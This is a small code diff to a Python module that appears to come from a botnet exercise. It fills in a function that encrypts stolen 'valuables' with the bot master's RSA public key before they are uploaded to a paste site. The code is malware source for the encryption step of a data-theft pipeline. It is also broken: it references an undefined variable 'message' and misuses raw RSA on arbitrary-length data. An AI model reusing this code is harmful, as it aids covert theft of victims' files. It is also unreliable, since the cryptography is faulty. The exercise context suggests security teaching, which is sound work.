@@ -1,6 +1,8 @@
 import os
 from Crypto.Signature import PKCS1_PSS
 from Crypto.Hash import SHA
+from Crypto import Random
+from Crypto.Cipher import PKCS1_v1_5
 from Crypto.PublicKey import RSA
 
 # Instead of storing files on disk,
@@ -16,7 +18,11 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-    return data
+    h=SHA.new(data)
+    key=RSA.importKey(open('../pastebot.net/master_rsa.pub'))
+    cipher = PKCS1_v1_5.new(key)
+    ciphertext = cipher.encrypt(message+h.digest())
+    return ciphertext
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
